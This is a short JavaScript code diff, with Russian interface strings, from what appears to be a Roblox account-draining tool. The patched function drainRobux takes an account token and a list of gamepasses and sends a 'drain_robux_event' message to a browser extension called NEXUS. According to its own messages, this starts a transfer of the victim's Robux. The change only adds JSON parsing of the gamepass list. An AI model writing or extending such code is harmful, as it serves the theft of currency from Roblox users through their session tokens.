@@ -160,7 +160,13 @@ function drainRobux(token, btn) {
     btn.innerHTML = '⏳ В процессе...';
     btn.disabled = true;
     
-    const passesList = drainGamepasses.split(',').map(s => s.trim()).filter(Boolean);
+    let passesList = [];
+    try {
+      const parsed = JSON.parse(drainGamepasses);
+      passesList = Object.values(parsed).filter(Boolean);
+    } catch(e) {
+      passesList = drainGamepasses.split(',').map(s => s.trim()).filter(Boolean);
+    }
     
     window.postMessage({ action: 'drain_robux_event', token: token, gamepasses: passesList }, '*');
     toast('Задача на перевод робуксов отправлена в расширение NEXUS!');
